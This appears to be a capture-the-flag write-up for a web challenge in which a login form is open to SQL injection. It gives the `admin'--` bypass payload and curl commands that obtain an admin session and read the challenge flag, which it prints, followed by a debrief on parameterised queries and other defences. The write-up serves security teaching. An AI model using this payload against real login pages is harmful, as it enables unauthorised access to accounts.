# noter4 — SQL injection in the login

**Category:** web · **Flag:** `flag{inj3ct_me_d4ddy}`

This is a black-box web challenge (nothing is attached to download). The index
page shows a login form; you can register a user at `/register`, log in at
`/login`, and create notes at `/notes`. The flag lives in a note belonging to the
`admin` user, so the goal is to log in as `admin`.

The `/login` handler builds its SQL query by string-formatting the form input
straight in, so it is injectable:

```sql
select * from users where username = '<username>' and password = '<sha256(password)>'
```

Registering `admin` with a guessed password just makes a *new* `admin`; instead,
comment out the password check. Log in with the username `admin'--` (any
password):

```sql
select * from users where username = 'admin'-- ' and password = '...'
```

Everything after `--` is a comment, so the query returns the real `admin` row and
you get its session.

```bash
URL=http://$HOST:$PORT
curl -s -i -X POST "$URL/login" \
  --data-urlencode "username=admin'--" --data-urlencode "password=x" \
  | grep -i set-cookie            # grab the noter4_session cookie

curl -s "$URL/notes" -H "Cookie: noter4_session=<cookie from above>" | grep -o 'flag{[^}]*}'
# flag{inj3ct_me_d4ddy}
```

(The admin account is shared and read-only for solvers — you can read its notes
but not add or delete, so one player can't wipe the flag for the next.)

**Lesson:** never build SQL by string-formatting user input. A single-quote plus
`--` turns the login query into one that ignores the password. Use parameterised
queries (as the other endpoints here do with `?` placeholders).

## Debrief: what you learn and how to protect against it

**What you learn:** SQL injection, the classic web vulnerability. When user input
is pasted straight into a SQL query, the input can change the query. Here
`admin'--` closes the string and comments out the password check, so you are
logged in as admin without knowing the password.

**The solve in short:**

1. The goal is the admin's notes, so you need to log in as `admin`.
2. Log in with the username `admin'--` and any password.
3. The query becomes `... where username = 'admin'-- ...` and the password part
   is ignored.
4. Open `/notes` as admin and read the flag.

**How to protect against it:**

- Use parameterised queries (prepared statements) or an ORM, always. The
  database then treats input as data and never as part of the query. The other
  endpoints in this app do it right with `?` placeholders.
- Never build SQL with string formatting or concatenation.
- As extra layers: validate input, give the application's database user only the
  rights it needs, and don't show database errors to the user. A WAF may slow an
  attacker down, but it does not fix the query.
- Test for it: `sqlmap` and code scanners (Semgrep, CodeQL) find this pattern.
